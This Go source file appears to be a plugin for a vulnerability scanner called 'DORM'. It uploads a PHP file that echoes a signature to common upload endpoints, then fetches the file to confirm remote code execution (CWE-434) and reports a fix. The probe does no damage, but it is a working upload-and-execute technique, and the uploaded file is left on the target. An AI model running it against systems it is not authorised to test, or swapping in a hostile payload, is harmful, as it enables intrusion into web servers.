package plugins

import (
	"DORM/models"
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"strings"
	"time"
)

type FileUploadPlugin struct{}

func (p *FileUploadPlugin) Name() string { return "Unrestricted File Upload (RCE)" }

func (p *FileUploadPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	endpoints := []string{"/upload", "/upload.php", "/api/upload", "/fileupload", "/ajax_upload.php"}
	uploadDirs := []string{"/uploads/", "/upload/", "/files/", "/images/", "/media/", "/"}

	uniqueID := time.Now().Unix()
	filename := fmt.Sprintf("dorm_test_%d.php", uniqueID)
	signature := fmt.Sprintf("DORM_RCE_CONFIRMED_%d", uniqueID)

	fileContent := fmt.Sprintf("<?php echo '%s'; ?>", signature)

	for _, ep := range endpoints {
		targetURL := baseURL + ep

		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body)

		part, err := writer.CreateFormFile("file", filename)
		if err != nil {
			continue
		}
		io.Copy(part, strings.NewReader(fileContent))

		writer.WriteField("submit", "Upload")
		writer.Close()

		req, _ := http.NewRequest("POST", targetURL, body)
		req.Header.Set("Content-Type", writer.FormDataContentType())
		req.Header.Set("User-Agent", "DORM-Enterprise-Scanner/1.5.0")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		if resp.StatusCode == 200 || resp.StatusCode == 201 || resp.StatusCode == 302 || resp.StatusCode == 303 {

			for _, dir := range uploadDirs {
				checkURL := baseURL + dir + filename
				checkReq, _ := http.NewRequest("GET", checkURL, nil)
				checkResp, err := client.Do(checkReq)

				if err == nil {
					defer checkResp.Body.Close()
					if checkResp.StatusCode == 200 {

						respBytes, _ := io.ReadAll(io.LimitReader(checkResp.Body, 2048))
						respStr := string(respBytes)

						if strings.Contains(respStr, signature) && !strings.Contains(respStr, "<?php") {
							return &models.Vulnerability{
								Target:      target,
								Name:        "Unrestricted File Upload (RCE Confirmed)",
								Severity:    "CRITICAL",
								CVSS:        9.8,
								Description: fmt.Sprintf("Successfully uploaded and executed a PHP file!\nUpload Endpoint: %s\nExecuted File: %s\nSignature: %s", targetURL, checkURL, signature),
								Solution:    "Implement strict file extension whitelisting, remove execute permissions on upload directories, and store files outside the web root.",
								Reference:   "OWASP Unrestricted File Upload / CWE-434",
							}
						} else if strings.Contains(respStr, "<?php") && strings.Contains(respStr, signature) {
							return &models.Vulnerability{
								Target:      target,
								Name:        "Arbitrary File Upload (Stored)",
								Severity:    "HIGH",
								CVSS:        7.5,
								Description: fmt.Sprintf("Successfully uploaded a PHP file, but server did not execute it (Source code returned).\nUpload Endpoint: %s\nFile Location: %s", targetURL, checkURL),
								Solution:    "Implement strict file extension whitelisting.",
								Reference:   "CWE-434: Unrestricted Upload of File with Dangerous Type",
							}
						}
					}
				}
			}
		}
	}
	return nil
}
